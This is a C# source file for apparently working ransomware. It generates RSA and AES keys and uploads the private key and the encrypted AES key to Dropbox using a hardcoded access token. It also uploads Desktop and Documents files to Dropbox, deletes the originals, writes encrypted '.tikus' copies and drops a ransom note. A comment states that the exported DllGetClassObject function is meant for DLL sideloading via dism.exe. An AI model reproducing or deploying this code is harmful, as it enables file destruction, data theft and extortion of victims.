using Dropbox.Api;
using Dropbox.Api.Files;
using RGiesecke.DllExport;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace Program
{
    public class Asymmetric
    {
        public class RSA
        {
            /// <summary>
            /// Create a public and private key.
            ///
            /// The RSACryptoServiceProvider supports key sizes from 384
            /// bits to 16384 bits in increments of 8 bits if you have the
            /// Microsoft Enhanced Cryptographic Provider installed. It
            /// supports key sizes from 384 bits to 512 bits in increments
            /// of 8 bits if you have the Microsoft Base Cryptographic
            /// Provider installed.
            /// </summary>
            /// <param name="publicKey">The created public key.</param>
            /// <param name="privateKey">The created private key.</param>
            /// <param name="keySize">Size of keys.</param>
            public static void CreateKeys(out string publicKey, out string privateKey, int keySize = 4096)
            {
                publicKey = null;
                privateKey = null;

                var csp = new CspParameters
                {
                    ProviderType = 1,
                    Flags = CspProviderFlags.UseArchivableKey,
                    KeyNumber = (int)KeyNumber.Exchange
                };

                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(keySize, csp);

                publicKey = rsa.ToXmlString(false);
                privateKey = rsa.ToXmlString(true);

                rsa.PersistKeyInCsp = false;
            }

            /// <summary>
            /// Encrypt data using a public key.
            /// </summary>
            /// <param name="bytes">Bytes to encrypt.</param>
            /// <param name="publicKey">Public key to use.</param>
            /// <returns>Encrypted data.</returns>
            public static byte[] Encrypt(byte[] bytes, string publicKey)
            {
                var csp = new CspParameters
                {
                    ProviderType = 1
                };

                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(csp);

                rsa.FromXmlString(publicKey);
                var data = rsa.Encrypt(bytes, false);

                rsa.PersistKeyInCsp = false;

                return data;
            }

            /// <summary>
            /// Encrypt data using a public key.
            /// </summary>
            /// <param name="input">Data to encrypt.</param>
            /// <param name="publicKey">Public key to use.</param>
            /// <returns>Encrypted data.</returns>
            public static string Encrypt(string input, string publicKey)
            {
                if (input == null)
                {
                    throw new Exception("Input cannot be null");
                }

                return Convert.ToBase64String(
                    Encrypt(
                        Encoding.UTF8.GetBytes(input),
                        publicKey));
            }

            /// <summary>
            /// Decrypt data using a private key.
            /// </summary>
            /// <param name="bytes">Bytes to decrypt.</param>
            /// <param name="privateKey">Private key to use.</param>
            /// <returns>Decrypted data.</returns>
            public static byte[] Decrypt(byte[] bytes, string privateKey)
            {
                var csp = new CspParameters
                {
                    ProviderType = 1
                };

                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(csp);

                rsa.FromXmlString(privateKey);
                var data = rsa.Decrypt(bytes, false);

                rsa.PersistKeyInCsp = false;

                return data;
            }

            /// <summary>
            /// Decrypt data using a private key.
            /// </summary>
            /// <param name="input">Base64 data to decrypt.</param>
            /// <param name="privateKey">Private key to use.</param>
            /// <returns>Decrypted data.</returns>
            public static string Decrypt(string input, string privateKey)
            {
                if (input == null)
                {
                    throw new Exception("Input cannot be null");
                }

                return Encoding.UTF8.GetString(
                    Decrypt(
                        Convert.FromBase64String(input),
                        privateKey));
            }
        }
    }

    public class GetKey
    {
        public static string GetPublicKey()
        {
            var publicKey = File.ReadAllText(Path.Combine(@"C:\Users\ch4rm\Desktop\encme", "public.key"));
            return publicKey;
        }

    }

    public class AES
    {

        public static byte[] AESEncrypt(byte[] clearData, byte[] aes_key, byte[] aes_iv)
        {
            MemoryStream ms = new MemoryStream();

            Rijndael alg = Rijndael.Create();

            alg.Key = aes_key;
            alg.IV = aes_iv;

            CryptoStream cs = new CryptoStream(ms,
               alg.CreateEncryptor(), CryptoStreamMode.Write);

            // Write the data and make it do the encryption 
            cs.Write(clearData, 0, clearData.Length);

            cs.Close();

            byte[] encryptedData = ms.ToArray();

            return encryptedData;
        }
    }

    public class Dropbox
    {
        public static string token = "PnVBRiPB-vQAAAAAAAAAAXQgy33NH-zcV0O_NaoOe_8ZZhb985g6yJ5vHmHAf450";

        public static DropboxClient dbx = new DropboxClient(token);

        public static async Task UploadFile(DropboxClient dbx, string fileToUpload, string folderName)
        {
            //upload file
            //var fileToUpload = $"{baseDir}\\encme.txt.ch4rm";
            var folder = $"/{folderName}";
            var fileName = Path.GetFileName(fileToUpload);
            using (MemoryStream mem = new MemoryStream(File.ReadAllBytes(fileToUpload)))
            {
                var updated = await dbx.Files.UploadAsync(
                folder + "/" + fileName,
                WriteMode.Overwrite.Instance,
                body: mem);
            }
        }

        public static async Task UploadFile(DropboxClient dbx, byte[] fileToUpload, string folderName, string fileName)
        {
            //upload file
            //var fileToUpload = $"{baseDir}\\encme.txt.ch4rm";
            var folder = $"/{folderName}";
            using (MemoryStream mem = new MemoryStream(fileToUpload))
            {
                var updated = await dbx.Files.UploadAsync(
                folder + "/" + fileName,
                WriteMode.Overwrite.Instance,
                body: mem);
            }
        }

        public static async Task<byte[]> DownloadFile(DropboxClient dbx)
        {
            string folder = "";
            string file = "";

            using (var response = await dbx.Files.DownloadAsync(folder + "/" + file))
            {
                var s = response.GetContentAsByteArrayAsync();
                s.Wait();
                var d = s.Result;
                return d;
            }
        }

        public static async Task Run()
        {
            using (DropboxClient dbx = new DropboxClient(token))
            {
                //display information
                var full = await dbx.Users.GetCurrentAccountAsync();
                Console.WriteLine("{0} - {1}", full.Name.DisplayName, full.Email);

                //listing files and directories
                var list = await dbx.Files.ListFolderAsync(string.Empty);
                foreach (var item in list.Entries)
                {
                    Console.WriteLine($"D {item.Name}");
                }

            }
        }
    }

    public class Random
    {
        private static System.Random random = new System.Random();

        public static byte[] GetRandomIV()
        {
            byte[] iv = new byte[16];

            for (int i = 0; i < 16; i++)
            {
                random.NextBytes(iv);
            }
            return iv;
        }

        public static byte[] GetRandomKey()
        {
            byte[] key = new byte[32];

            for (int i = 0; i < 32; i++)
            {
                random.NextBytes(key);
            }
            return key;
        }
    }

    public class Program
    {
        public static byte[] Compress(byte[] data)
        {
            MemoryStream output = new MemoryStream();
            using (DeflateStream dstream = new DeflateStream(output, CompressionLevel.Optimal))
            {
                dstream.Write(data, 0, data.Length);
            }
            return output.ToArray();
        }

        public static string GenKeyPairs()
        {
            Asymmetric.RSA.CreateKeys(out var publicKey, out var privateKey);

            UploadKeys(Encoding.UTF8.GetBytes(privateKey), "private.key");
            
            //File.WriteAllText(Path.Combine(@"C:\Users\ch4rm\Desktop\encme", "public.key"), publicKey);
            //File.WriteAllText(Path.Combine( @"C:\Users\ch4rm\Desktop\encme", "private.key"), privateKey);
            return publicKey;
        }

        public static void UploadKeys(byte[] key, string fileName)
        {
            var remotePath = $"{Environment.MachineName}/agent_tikus_storage";

            var upload = Task.Run(() => Dropbox.UploadFile(Dropbox.dbx, key, remotePath, fileName));
            upload.Wait();
        }

        //https://stackoverflow.com/questions/321370/how-can-i-convert-a-hex-string-to-a-byte-array
        public static byte[] StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }

        /*
        public static string publicKey = GenKeyPairs();

        //public static byte[] aes_key = Asymmetric.RSA.Decrypt(GetKey.GetAESKey(), privateKey);
        public static byte[] aes_key = Random.GetRandomKey();

        public static byte[] encAesKey = Asymmetric.RSA.Encrypt(aes_key, publicKey);

        //public static byte[] aes_iv = Asymmetric.RSA.Decrypt(GetKey.GetAESIV(), privateKey);
        public static byte[] aes_iv = Random.GetRandomIV();

        public static byte[] encIVKey = Asymmetric.RSA.Encrypt(aes_iv, publicKey);

        public static string baseDir = @"C:\Users\ch4rm\Desktop\encme";

        public static string ransomFormat = ".tikus";

        public static string computerName = Environment.MachineName;

        public static string ransomNotes = @"
All your files have been encrypted. I don't ask for money. All I want is a cheese...

     ___ _____
    /\ (_)    \
    /  \      (_,
    _)  _\   _    \
/   (_)\_( )____\
\_     /    _  _/
    ) /\/  _ (o)(
    \ \_) (o)   /
    \/________/ 
            
Have a nice day :)
            ";
        */

        public static void LeaveRansomNote(string ransomNotePath)
        {
            string ransomNote = @"
All your files have been encrypted. I don't ask for money. All I want is a cheese...

     ___ _____
    /\ (_)    \
    /  \      (_,
    _)  _\   _    \
/   (_)\_( )____\
\_     /    _  _/
    ) /\/  _ (o)(
    \ \_) (o)   /
    \/________/ 
            
Have a nice day :)
            ";
            File.WriteAllText(ransomNotePath, ransomNote);
        }

        // this export call can be used sideloaded with \windows\system32\dism.exe, dismcore.dll
        [DllExport]
        public static void DllGetClassObject()
        {
            var computerName = Environment.MachineName;

            var publicKey = GenKeyPairs();

            byte[] aes_key = Random.GetRandomKey();
            byte[] encAesKey = Asymmetric.RSA.Encrypt(aes_key, publicKey);

            byte[] aes_iv = Random.GetRandomIV();
            byte[] encIVKey = Asymmetric.RSA.Encrypt(aes_iv, publicKey);

            var baseDir = @"C:\Users\REUSER\Desktop\teloq";

            var ransomFormat = ".tikus";

            var blockExtensions = new List<string> { "exe", "tikus", "key", "pub", "iv", "idx" };

            var uselessFilesAndFolders = new List<string> { ".git", "ineedcheese" };

            var targetDirs = Directory.EnumerateFiles(baseDir, "*.*", SearchOption.AllDirectories);

            var userDesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            var folderToExtract = new List<string> { userDesktopPath , "Documents" };
            
            byte[] encrypted;

            //write aes_key and aes_iv
            //byte[] aesKeyByte = Asymmetric.RSA.Encrypt(Convert.FromBase64String("AXe8YwuIn1zxt3FPWTZFlAa14EHdPAdN9FaZ9RQWihc="), publicKey);
            //byte[] aeIVByte = Asymmetric.RSA.Encrypt(Convert.FromBase64String("bsxnWolsAyO7kCfWuyrnqg=="), publicKey);

            //write symmetic key
            UploadKeys(encAesKey, "aes.key");
            //File.WriteAllBytes(Path.Combine(baseDir, "aes.key"), encAesKey);
            UploadKeys(encIVKey, "aes.iv");
            //File.WriteAllBytes(Path.Combine(baseDir, "aes.iv"), encIVKey);

            foreach (var file in targetDirs.Where(x => uselessFilesAndFolders.Any(s => !x.Contains(s))))
            {
                var newFileExtension = $"{file}{ransomFormat}";
                var ransomNotePath = $"{Path.GetDirectoryName(file)}\\ineedcheese.txt";

                if (!File.Exists(newFileExtension))
                {
                    if (!blockExtensions.Any(x => file.EndsWith(x)))
                    {
                        try
                        {
                            var outFolder = computerName + Path.GetDirectoryName(file).Replace(baseDir, "").Replace("\\", "/");

                            var fileContent = File.ReadAllBytes(file);

                            if (folderToExtract.Any(i => file.Contains(i)))
                            {
                                //upload file to google drive (do in background)
                                var task = Task.Run(() => Dropbox.UploadFile(Dropbox.dbx, file, outFolder));
                                task.Wait();
                            }

                            //delete the file
                            File.Delete(file);

                            //encrypted = Asymmetric.RSA.Encrypt(fileContent, publicKey);
                            encrypted = AES.AESEncrypt(fileContent, aes_key, aes_iv);

                            File.WriteAllBytes(newFileExtension, encrypted);

                            if (!File.Exists(ransomNotePath))
                                LeaveRansomNote(ransomNotePath);
                            
                        }
                        catch
                        {

                        }


                    }

                }

            }

        }
    }
}
